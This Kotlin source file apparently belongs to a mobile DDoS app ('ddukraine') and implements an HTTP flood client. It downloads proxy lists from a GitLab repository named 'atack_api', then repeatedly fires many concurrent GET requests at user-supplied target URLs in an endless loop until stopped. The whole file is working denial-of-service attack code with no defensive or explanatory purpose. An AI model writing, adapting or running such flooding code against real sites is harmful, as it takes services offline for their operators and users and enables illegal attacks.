package ua.app.ddukraine.mpp.client

import io.ktor.client.request.*
import io.ktor.client.statement.*
import kotlinx.coroutines.*
import ua.app.ddukraine.mpp.client.models.GitlabFile
import ua.app.ddukraine.mpp.client.models.Proxy
import kotlin.native.concurrent.SharedImmutable

@SharedImmutable
internal expect val ApplicationDispatcher: CoroutineDispatcher

@DelicateCoroutinesApi
class ApplicationApi {

    private val client = getHttpClient()

    private var job: Job? = null

    private var enabled = true

    private suspend fun getFiles(): List<GitlabFile> {
        return client.get {
            url("https://gitlab.com/api/v4/projects/34043405/repository/tree?path=proxy")
        }
    }

    private suspend fun getProxyFilesRaw(files: List<GitlabFile>): List<String> {
        val result = mutableListOf<String>()
        files.forEach { gitlabFile ->
            val proxyRaw: String = client.get {
                url("https://gitlab.com/cto.endel/atack_api/-/raw/master/proxy/${gitlabFile.name}")
            }
            result.add(proxyRaw)
        }

        return result
    }

    private fun mapRawToProxy(rawFiles: List<String>): List<Proxy> {
        return rawFiles.map {
            it.split("\n")
        }
            .flatten()
            .mapIndexed { index, proxyRaw ->
                val proxyData = proxyRaw.split(":")
                if (proxyData.size < 4) {
                    null
                } else {
                    Proxy.parse(proxyRaw, index)
                }
            }
            .filterNotNull()
    }

    fun loadProxies(callback: (Result<List<Proxy>>) -> Unit) {
        job = CoroutineScope(Dispatchers.Main).launch {
            val result = runCatching {
                val files: List<GitlabFile> = getFiles()
                val proxyRawFiles: List<String> = getProxyFilesRaw(files)
                mapRawToProxy(proxyRawFiles)
            }.onFailure {
                it.printStackTrace()
            }
            callback.invoke(result)
        }
    }

    fun stop(callback: (Boolean) -> Unit) {
        enabled = false
        job?.cancel()
        callback(false)
    }

    fun startSending(url: String, timeout: Long, threadCount: Int,callback: (String, Boolean) -> Unit) {
        job = CoroutineScope(Dispatchers.Main).launch {
            runCatching {
                val urls = parseUrls(url)
                if (urls.isEmpty())
                    throw IllegalArgumentException()

                while (enabled) {
                    urls.forEach {
                        for (i in 1..threadCount) {
                            async { sendRequest(it, callback) }
                        }
                    }
                    delay(timeout)
                }
            }.onFailure {
                it.printStackTrace()
                job?.cancel()
                it.message?.let { callback(it, false) }
            }
        }

        job?.invokeOnCompletion { throwable ->
            if (throwable is CancellationException)
                println("Coroutine is Cancelled!")
        }
    }

    private fun parseUrls(urls: String): List<String> {
        return urls.split("\n").map { it.trim() }
            .filter { it.contains("http://") || it.contains("https://") }
    }

    private suspend fun sendRequest(url: String, callback: (String, Boolean) -> Unit) {
        runCatching {
            val result: HttpResponse = client.get {
                url(url)
            }
            callback(result.toString(), true)
        }.onFailure {
            it.printStackTrace()
            it.message?.let { callback(it, true) }
        }
    }
}
